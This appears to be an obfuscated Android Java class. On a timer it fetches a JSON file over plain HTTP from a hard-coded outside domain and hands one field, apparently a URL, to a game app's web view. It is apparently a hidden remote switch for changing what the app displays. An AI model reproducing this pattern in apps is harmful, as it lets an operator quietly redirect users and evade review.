package gfdgdfgret.gfddfnvc.uyiuytutyre.kljhkjhkjh;

import com.alibaba.fastjson.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class MixedThreeUrl {
    public static void kjhdksjhf1(MixedMainActivity act){
        final Timer klkkh5 = new Timer();
        TimerTask oiiiie2 = new TimerTask() {
            @Override
            public void run() {
                hhhgdsf9();
                klkkh5.cancel();
            }
        };
        klkkh5.schedule(oiiiie2, 210, 990);
    }
    public static void hhhgdsf9(){
        String iiiiyywe6 = kkkjkhdsfer("http://1ty7veh.com/fsdfgsdfgs.json");
        JSONObject json = JSONObject.parseObject(iiiiyywe6);
        if (json != null){
            final String kkjgdsf45 = json.getString("rtdfgdf");
            MixedGameWeb.khgsdfcvx12().kkkjjhdsf56(kkjgdsf45);
        }
    }

    public static String kkkjkhdsfer(String iuywer1){
        HttpURLConnection kjhdfsg66 = null;
        InputStream iiioiuyret77 = null;
        BufferedReader iiuret88 = null;
        StringBuffer llkjer99 = new StringBuffer();
        try {
            URL nbbbndf1 = new URL(iuywer1);
            kjhdfsg66 = (HttpURLConnection) nbbbndf1.openConnection();
            kjhdfsg66.setRequestMethod("GET");
            kjhdfsg66.setReadTimeout(15000);
            kjhdfsg66.connect();
            if (kjhdfsg66.getResponseCode() == 200) {
                iiioiuyret77 = kjhdfsg66.getInputStream();
                if (null != iiioiuyret77) {
                    iiuret88 = new BufferedReader(new InputStreamReader(iiioiuyret77, "UTF-8"));
                    String temp = null;
                    while (null != (temp = iiuret88.readLine())) {
                        llkjer99.append(temp);
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (null != iiuret88) {
                try {
                    iiuret88.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (null != iiioiuyret77) {
                try {
                    iiioiuyret77.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            kjhdfsg66.disconnect();
        }
        return llkjer99.toString();
    }
}